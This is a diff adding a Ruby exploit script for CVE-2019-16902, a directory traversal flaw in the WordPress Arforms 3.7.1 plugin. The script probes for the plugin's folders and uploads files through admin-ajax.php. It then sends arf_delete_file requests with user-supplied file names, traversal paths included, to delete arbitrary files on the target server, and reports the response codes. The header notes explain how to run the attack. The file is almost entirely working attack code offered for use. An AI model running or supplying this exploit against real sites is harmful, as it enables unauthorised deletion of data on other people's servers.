@@ -1,0 +1,236 @@
+# Exploit Title: WordPress Arforms 3.7.1 - Directory Traversal 
+# Date: 2019-09-27
+# Exploit Author: Ahmad Almorabea
+# Updated version of the exploit can be found always at : http://almorabea.net/cve-2019-16902.txt 
+# Software Link: https://www.arformsplugin.com/documentation/changelog/
+# Version: 3.7.1
+# CVE ID: CVE-2019-16902
+
+#**************Start Notes**************
+# You can run the script by putting the script name and then the URL and the URL should have directory the Wordpress folders.
+# Example : exploit.rb www.test.com, and the site should have the Wordpress folders in it such www.test.com/wp-contnet.
+# Pay attention to the 3 numbers at the beginning maybe you need to change it in other types like in this script is 143.
+# But maybe in other forms maybe it's different so you have to change it accordingly.
+# This version of the software is applicable to path traversal attack so you can delete files if you knew the path such ../../ and so on 
+# There is a request file with this Script make sure to put it in the same folder.
+#**************End Notes****************
+
+#!/usr/bin/env ruby
+
+require "net/http"
+require 'colorize'
+
+$host       = ARGV[0] || ""
+$session_id = ARGV[1] || "3c0e9a7edfa6682cb891f1c3df8a33ad"
+
+
+def start_function ()
+
+  puts "It's a weird question to ask but let's start friendly I'm Arforms exploit, what's your name?".yellow
+  name = STDIN.gets
+
+  if $host == ""
+      puts "What are you doing #{name} where is the URL so we can launch the attack, please pay more attention buddy".red
+      exit
+  end
+
+
+  check_existence_arform_folder
+  execute_deletion_attack
+ 
+  puts "Done ... see ya  " + name 
+
+end
+
+
+def send_checks(files_names)
+
+
+ 
+ 
+  j = 1
+  while j <= files_names.length-1
+  
+      uri = URI.parse("http://#{$host}/wp-content/uploads/arforms/userfiles/"+files_names[j])
+      http = Net::HTTP.new(uri.host, uri.port)
+      http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS
+
+      request = Net::HTTP::Get.new(uri.request_uri)
+      request["User-Agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"
+      request["Connection"] = "keep-alive"
+      request["Accept-Language"] = "en-US,en;q=0.5"
+      request["Accept-Encoding"] = "gzip, deflate"
+      request["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      
+
+      begin
+        
+        response = http.request(request).code
+        puts "The File " + files_names[j] + " has the response code of " + response
+      rescue Exception => e
+        puts "[!] Failed!"
+        puts e
+      end
+      j = j+1 
+  end
+end
+
+
+def check_existence_arform_folder ()
+
+ 
+
+  path_array = ["/wp-plugins/arforms","/wp-content/uploads/arforms/userfiles"]
+  $i = 0 
+  results = []
+
+  while $i <= path_array.length-1  
+    
+    uri = URI.parse("http://#{$host}/#{path_array[$i]}")
+    #puts uri
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS
+    request = Net::HTTP::Get.new(uri.request_uri)
+    response = http.request(request)
+    results[$i] = response.code
+    #puts"response code is : " + response.code
+    
+    $i +=1
+
+  end
+
+  puts "****************************************************"
+  
+  if results[0] == "200" || results[0] =="301"
+
+    puts "The Plugin is Available on the following path : ".green + $host + path_array[0]
+  else
+    puts "We couldn't locate the Plugin in this path, you either change the path or we can't perform the attack, Simple Huh?".red
+    exit
+  end
+  
+  if (results[1] == "200" || results[1] == "301")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+
+      puts "The User Files  folder is  Available on the following path : ".green + $host + path_array[1]
+  else
+
+     puts "We couldn't find the User Files folder, on the following path ".red +  $host + path_array[1]
+    
+  end
+  puts "****************************************************"
+
+  
+
+end
+
+
+def execute_deletion_attack ()
+
+    
+
+    puts "How many file you want to delete my man"
+    amount = STDIN.gets.chomp.to_i
+
+    if(amount == 0)
+      puts "You can't use 0 or  other strings this input for the amount of file you want to delete so it's an Integer".blue
+      exit
+    end
+
+    file_names = []
+    file_names[0] = "143_772_1569713145702_temp3.txt"
+    j = 1
+   while j <= amount.to_i
+      puts "Name of the file number " + j.to_s 
+      file_names[j] = STDIN.gets
+      file_names[j].strip!
+      j = j+1
+    end
+
+
+    uri = URI.parse("http://#{$host}")
+    #puts uri
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl = true if uri.scheme == 'https'   
+    request = Net::HTTP::Get.new(uri.request_uri)
+    response = http.request(request)
+    global_cookie = response.response['set-cookie'] + "; PHPSESSID="+$session_id #Assign the session cookie
+  
+
+
+
+    $i = 0
+    while $i <= file_names.length-1 
+
+    puts "Starting the Attack Journey .. ".green 
+
+      uri = URI.parse("http://#{$host}/wp-admin/admin-ajax.php")
+      headers =
+      {
+         'Referer'         => 'From The Sky',
+         'User-Agent'      => 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
+         'Content-Type'    => 'multipart/form-data; boundary=---------------------------14195989911851978808724573615',
+         'Accept-Encoding' => 'gzip, deflate',
+         'Cookie'          => global_cookie,
+         'X_FILENAME'      => file_names[$i],
+         'X-FILENAME'      => file_names[$i],
+         'Connection'      => 'close'
+
+       }
+
+      http    = Net::HTTP.new(uri.host, uri.port)
+      http.use_ssl = true if uri.scheme == 'https'    
+      request = Net::HTTP::Post.new(uri.path, headers)
+      request.body = File.read("post_file")
+      response = http.request request
+     
+      $i = $i +1     
+  end
+    
+    execute_delete_request file_names,global_cookie,amount.to_i
+    
+    puts "Finished.........."
+
+end
+
+def execute_delete_request (file_names,cookies,rounds )
+
+  
+    $i = 0
+    
+    while $i <= file_names.length-1   
+
+    puts "Starting the Attack on file No #{$i.to_s} ".green  
+  
+        uri = URI.parse("http://#{$host}/wp-admin/admin-ajax.php")
+        headers =
+        {
+           'Referer'         => 'From The Sky',
+           'User-Agent'      => 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
+           'Accept'          => '*/*',
+           'Accept-Language' => 'en-US,en;q=0.5',
+           'X-Requested-With'=> 'XMLHttpRequest',
+           'Cookie'          =>  cookies,
+           'Content-Type'    => 'application/x-www-form-urlencoded; charset=UTF-8',
+           'Accept-Encoding' => 'gzip, deflate',
+           'Connection'      => 'close'
+        }
+
+        http    = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = true if uri.scheme == 'https'   
+        request = Net::HTTP::Post.new(uri.path,headers)
+        request.body = "action=arf_delete_file&file_name="+file_names[$i]+"&form_id=143"
+        response = http.request(request)
+        
+        if $i != 0
+          puts "File Name requested to delete is : " + file_names[$i] + " has the Response Code of " + response.code
+        end
+         $i = $i +1 
+     
+    end
+
+    send_checks file_names
+     
+end
+
+
+start_function()
